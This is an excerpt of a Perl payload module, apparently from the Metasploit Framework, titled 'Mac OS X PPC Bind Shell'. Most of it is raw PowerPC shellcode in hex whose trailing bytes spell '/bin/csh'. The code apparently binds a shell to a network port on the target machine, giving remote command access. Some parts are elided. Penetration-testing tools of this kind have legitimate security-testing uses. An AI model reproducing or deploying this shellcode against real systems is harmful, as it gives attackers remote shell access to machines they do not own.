...
package Msf::Payload::osx_ppc_bind;
use strict;
use base 'Msf::PayloadComponent::BindConnection';

my $info =
{
  'Name'         => 'Mac OS X PPC Bind Shell',
  'Version'      => '$Revision$',
...
sub Generate {
  ...
  0x2c05ffff,0x4082ffe5,0x38000042,0x44000002,
  0x7c000278,0x7ca52a79,0x4082fffd,0x7c6802a6,
  0x38630028,0x9061fff8,0x90a1fffc,0x3881fff8,
  0x3800003b,0x7c0004ac,0x44000002,0x7c000278,
  0x7fe00008,0x2f62696e,0x2f637368,0x00000000,
  );
